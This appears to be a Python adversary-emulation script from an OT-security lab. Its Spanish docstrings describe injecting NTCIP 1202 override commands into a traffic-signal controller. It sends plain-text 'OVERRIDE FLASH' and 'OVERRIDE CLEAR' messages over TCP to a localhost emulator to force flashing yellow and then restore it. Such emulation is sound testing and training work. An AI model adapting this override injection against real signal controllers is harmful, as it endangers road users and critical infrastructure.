#!/usr/bin/env python3
"""attacker/attack_ntcip.py — Script de emulación adversaria NTCIP 1202 (Categoría B OT)

Simula inyección de comandos de fase NTCIP 1202 TCP (FLASHING_YELLOW) contra el PLC de transporte/semáforos.
"""

from __future__ import annotations

import socket
from typing import Dict, Any


class NtcipAttacker:
    """Emulador de ataque NTCIP 1202 sobre TCP 161."""

    def __init__(self, target_host: str = '127.0.0.1', target_port: int = 161) -> None:
        self.target_host = target_host
        self.target_port = target_port

    def inject_flash_override(self) -> Dict[str, Any]:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)
        try:
            s.connect((self.target_host, self.target_port))
            s.sendall(b'OVERRIDE FLASH\n')
            resp = s.recv(1024).decode('utf-8', errors='replace')
            s.close()
            return {'status': 'SUCCESS', 'response': resp, 'flashing': 'FLASHING_YELLOW' in resp}
        except Exception as exc:
            s.close()
            return {'status': 'FAILED', 'error': str(exc)}

    def clear_override(self) -> Dict[str, Any]:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)
        try:
            s.connect((self.target_host, self.target_port))
            s.sendall(b'OVERRIDE CLEAR\n')
            resp = s.recv(1024).decode('utf-8', errors='replace')
            s.close()
            return {'status': 'SUCCESS', 'response': resp, 'cleared': 'NS_GREEN' in resp}
        except Exception as exc:
            s.close()
            return {'status': 'FAILED', 'error': str(exc)}


def main() -> None:
    attacker = NtcipAttacker()
    res1 = attacker.inject_flash_override()
    print('[*] NTCIP Flash Override Result:', res1)
    res2 = attacker.clear_override()
    print('[*] NTCIP Clear Result:', res2)


if __name__ == '__main__':
    main()
